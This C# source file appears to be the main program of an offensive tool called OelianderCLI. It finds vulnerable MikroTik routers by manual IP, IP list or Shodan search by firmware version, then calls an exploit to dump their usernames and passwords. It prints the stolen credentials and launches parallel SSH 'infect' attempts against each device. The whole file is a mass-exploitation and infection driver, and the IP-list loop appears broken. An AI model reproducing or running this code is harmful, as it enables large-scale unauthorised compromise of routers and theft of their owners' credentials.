using OelianderCLI;
using System.Collections;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;

namespace OelianderCLI
{
    public class Program
    {

        public static Settings? settings = new Settings();
        private static string Label = "\n" +
      @"      ,----..                    " + "\n" +
      @"     /   /   \              ,--,                         " + "\n" +
      @"    /   .     :           ,--.'|     ,--,                                 ,---,                    " + "\n" +
      @"   .   /   ;.  \          |  | :   ,--.'|                     ,---,     ,---.'|            __  ,-. " + "\n" +
      @"  .   ;   /  ` ;          :  : '   |  |,                  ,-+-. /  |    |   | :          ,' ,'/ /| " + "\n" +
      @"  ;   |  ; \ ; |   ,---.  |  ' |   `--'_      ,--.--.    ,--.'|'   |    |   | |   ,---.  '  | |' | " + "\n" +
      @"  |   :  | ; | '  /     \ '  | |   ,' ,'|    /       \  |   |  ,'' |  ,--.__| |  /     \ |  |   ,' " + "\n" +
      @"  .   |  ' ' ' : /    /  ||  | :   '  | |   .--.  .-. | |   | /  | | /   ,'   | /    /  |'  :  /   " + "\n" +
      @"  '   ;  \; /  |.    ' / |'  : |__ |  | :    \__\/: . . |   | |  | |.   '  /  |.    ' / ||  | '    " + "\n" +
      @"   \   \  ',  / '   ;   /||  | '.'|'  : |__  ,' .--.; | |   | |  |/ '   ; |:  |'   ;   /|;  : |    " + "\n" +
      @"    ;   :    /  '   |  / |;  :    ;|  | '.'|/  /  ,.  | |   | |--'  |   | '/  ''   |  / ||  , ;    " + "\n" +
      @"     \   \ .'   |   :    ||  ,   / ;  :    ;  :   .'   \|   |/      |   :    :||   :    | ---'     " + "\n" +
      @"      `---`      \   \  /  ---`-'  |  ,   /|  ,     .-./'---'        \   \  /   \   \  /           " + "\n" +
      @"                  `----'            ---`-'  `--`---'                  `----'     `----'            " + "\n";

        static void Main(string[] args)
        {
            Settings.LoadSettings();
        retry:
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine(Label + "\n\n");

            BetterConsole.WriteNumber(1, "Manual IP");
            BetterConsole.WriteNumber(2, "IP List");
            BetterConsole.WriteNumber(3, "Shodan Scanner");
            BetterConsole.WriteNumber(4, "Settings");
            string nr = Console.ReadLine();
            switch (nr)
            {
                case "1":
                    BetterConsole.WriteLine("#############################");
                    BetterConsole.WriteSelection("Target IP: ");
                    string? ip = Console.ReadLine();
                    BetterConsole.WriteLine("#############################");
                    TryExploit(ip);
                    Console.WriteLine($"Done, press enter to continue!");
                    Console.ReadLine();
                    break;

                case "2":
                    BetterConsole.WriteLine("#############################");
                    BetterConsole.WriteSelection("Full/Path/to/List.txt: ");
                    string? _list = Console.ReadLine();
                    BetterConsole.WriteLine("#############################");
                    foreach (var _ip in _list)
                        TryExploit(Convert.ToString(_ip));
                    Console.WriteLine($"Done, press enter to continue!");
                    Console.ReadLine();
                    break;

                case "3":
                    BetterConsole.WriteLine("#############################");
                    BetterConsole.WriteLine("Example: 6.30, 6.31, 6.32... etc.");
                    BetterConsole.WriteSelection("MikroTik Version: ");
                    string? version = Console.ReadLine();
                    BetterConsole.WriteLine("#############################");
                    ShodanResponse? sr = ShodanScanner.GetShodanSearch(version);
                    Console.WriteLine("Found " + sr.matches.Count + " IP's");
                    foreach (Match m in sr.matches)
                    {
                        Console.WriteLine($"Attempting: {m.ip_str}");
                        TryExploit(m.ip_str);
                    }
                    Console.WriteLine($"Done, press enter to continue!");
                    Console.ReadLine();
                    break;

                case "4":
                retry2:
                    BetterConsole.WriteLine("#############################");
                    PropertyInfo[] props = Settings.GetSettingVariables();
                    for (int i = 0; i < props.Length; i++)
                        BetterConsole.WriteNumber(i, $"{props[i].Name}: {props[i].GetValue(props[i], null)}", ConsoleColor.Green); // get value crash
                    BetterConsole.WriteSelection("Selection: ");
                    string? s = Console.ReadLine();
                    try
                    {
                        int ss = Convert.ToInt32(s);
                        for (int i = 0; i < props.Length; i++)
                            if (i == ss)
                            {
                                BetterConsole.WriteSelection("New value: ");
                                string? newval = Console.ReadLine();
                                try { props[i].SetValue(props[i], newval); Settings.SaveSettings(); } catch (Exception ex) { Console.WriteLine(ex.Message); }
                                break;
                            }
                    }
                    catch { goto retry2; }
                    BetterConsole.WriteLine("#############################");
                    Console.WriteLine($"Done, press enter to continue!");
                    Console.ReadLine();
                    break;

                default:
                    goto retry;
            }

            goto retry;
        }
        private static void TryExploit(string ip)
        {
            try
            {
                List<User> users = Exploit.GetUsers(ip);
                if (users != null && users.Count > 0)
                {
                    List<Thread> sshThreads = new List<Thread>();
                    foreach (User user in users)
                    {
                        BetterConsole.WriteLine($"Username: {user.Username}".PadRight(32) + $"Password: {user.Password}");
                        sshThreads.Add(new Thread(() => Exploit.TryInfect(ip, user)));
                    }

                    foreach (User user in users)
                        BetterConsole.WriteWarning($"Attempting to SSH into '{user.Username}@{ip}' using password: {user.Password}");

                    Parallel.ForEach(sshThreads, thread =>
                    {
                        thread.Start();
                        thread.Join();
                    });
                    BetterConsole.WriteLine("#############################");
                }
                else { BetterConsole.WriteMinus("Exploit Failed: Target might not be vulnerable!"); }
            }
            catch (Exception ex)
            {
                BetterConsole.WriteMinus(ex.Message.ToString());
                Console.ReadLine();
            }
        }
    }
}